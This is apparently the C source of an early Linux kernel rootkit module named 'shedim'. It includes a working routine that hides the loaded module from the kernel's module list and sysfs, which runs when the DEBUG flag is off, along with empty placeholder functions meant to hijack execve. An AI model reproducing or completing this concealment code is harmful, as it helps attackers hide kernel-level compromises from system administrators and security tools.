#include <linux/module.h>
#include <linux/init.h>

#define RK_NAME "shedim"
#define DEBUG 1

void rk_hide(void) {
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
}

void rk_hijack_execve(void) {
}

void rk_unhijack_execve(void) {
}

static int __init rk_init(void) {
#ifdef DEBUG
	pr_info("%s module loaded at 0x%p\n", RK_NAME, rk_init);
#else
	rk_hide();
#endif

	rk_hijack_execve();
	return 0;
}


static void __exit rk_exit(void) {
#ifdef DEBUG
	pr_info("%s module un-loaded at 0x%p\n", RK_NAME, rk_exit);
#endif
	rk_unhijack_execve();
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_AUTHOR("Tommy Pujol");
MODULE_LICENSE("GPL");
